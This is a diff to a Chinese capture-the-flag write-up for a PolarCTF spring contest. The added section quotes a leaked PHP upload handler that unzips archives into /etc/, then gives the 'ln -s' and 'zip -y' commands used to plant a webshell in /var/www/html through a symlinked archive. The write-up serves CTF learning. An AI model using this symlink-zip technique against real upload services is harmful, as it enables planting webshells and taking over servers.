@@ -2,6 +2,8 @@
 title: PolarCTF2026春季赛
 date: 2026-03-20 21:15:49
 tags:
+index_img: https://gitee.com/bobrocket/img/raw/master/image-20260331151544965.png
+categories: CTF
 ---
 
 平台和💩一样
@@ -305,3 +307,61 @@ include $file;
 ```
 
 我们用这个php文件包含另一个就出来了
+
+## 狗黑子最后的起舞
+
+打开页面只有一个polar，扫一下目录，发现
+
+![image-20260323145608734](https://gitee.com/bobrocket/img/raw/master/image-20260323145608734.png)
+
+注册，登录，啥也没有
+
+![image-20260323145647894](https://gitee.com/bobrocket/img/raw/master/image-20260323145647894.png)
+
+居然还要再扫一遍ghzpolar目录！！！
+
+![image-20260323145739512](https://gitee.com/bobrocket/img/raw/master/image-20260323145739512.png)
+
+发现一堆git，用git_extract工具发现一个gouheizi.php泄露，内容如下
+
+```php
+<?php
+
+if (isset($_FILES['file'])) {
+    $f = $_FILES['file'];
+    if ($f['error'] === UPLOAD_ERR_OK) {
+        $dest = '/etc/' . time() . '_' . basename($f['name']);
+        if (move_uploaded_file($f['tmp_name'], $dest)) {
+            $escapedDest = escapeshellarg($dest);
+           exec("unzip -o $escapedDest -d /etc/ 2>&1");
+            if ($code !== 0) {
+             exec("unzip -o $escapedDest -d /etc/ 2>&1");
+            }
+            unlink($dest);
+            echo "ghz";
+        }
+    }
+}
+```
+
+一个文件上传的后端，会把zip压缩包解压到/etc目录下，这里考察软链接
+
+我们创建一个指向/var/www/html的软链接
+
+```
+ln -s /var/www/html 
+```
+
+再把它压缩，上传
+
+```
+zip -y 1.zip html
+```
+
+![image-20260323150146143](https://gitee.com/bobrocket/img/raw/master/image-20260323150146143.png)
+
+再新建一个html文件夹，把🐎放进去，连带文件夹一起压缩，上传
+
+这样🐎就写进去了
+
+![image-20260323150131275](https://gitee.com/bobrocket/img/raw/master/image-20260323150131275.png)
